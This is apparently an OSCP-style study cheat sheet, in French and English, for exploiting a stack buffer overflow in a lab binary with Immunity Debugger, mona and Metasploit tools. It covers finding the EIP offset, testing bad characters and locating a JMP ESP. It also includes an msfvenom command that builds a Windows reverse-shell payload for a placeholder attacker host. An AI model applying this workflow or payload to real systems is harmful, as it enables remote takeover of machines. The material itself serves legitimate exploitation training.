# MONA

## add to path in immunitydbg

```sh
!mona config -set workingfolder c:\mona\%p
```

## generate pattern and find EIP addr

(Fuzzing crashed at 2000 bytes)
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
!mona findmsp -distance 2400
```
EIP contains normal pattern : 0x6f43396e (offset 1978)

## test des bads char:

(ESP à l'adresse  0199FA30)
```sh
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 0199FA30
```

on rajoute 00 au bad chars

00 07 08 2e 2f a0 a1 
"\x00\x07\x08\x2e\x2f\xa0\xa1"

mais attention les bytes qui se suivent ne sont probablement pas des badchars, il nous reste donc:

\x00\x07\x2e\xa0


## trouver un jmp esp

```sh
!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"
```

réponse:
625011af

dans exploit.py
retn = "\xaf\x11\x50\x62"


## autre exemple

## BOF + JMP ESP quickly

1. run imunity as admin

2. open oscp.exe

3. add mona to path: `!mona config -set workingfolder c:\mona\%p`

4. run fuzzer.py

5. generate pattern: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <fuzzer length + 400>` and place it in payload variable in exploit.py

6. crash the app. find the EIP addr/offset: `!mona findmsp -distance <fuzzer length + 400>` then set offset variable in exploit.py ("EIP contains normal pattern : ... (offset XXXX)")

7. generate badchars: `!mona bytearray -b "\x00"`

8. find bachars :
    run badchar.py and place it in payload variable
    run exploit.py crash the vulnerable app
    `!mona bytearray -b "\x00"` 
    `!mona compare -f C:\mona\oscp\bytearray.bin -a < ESP address>`
    ne prendre en compte que les premiers chars d'une suite

9. find jmp esp: `!mona jmp -r esp -cpb "\x00\x<badchars>"` and set rtn variable in exploit.py

10. generate payload for exploit.py `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x<badchars>" -f c`

11. set pading in exploit.py: `padding = "\x90" * 16`

12. set nc listenet and run exploit.py




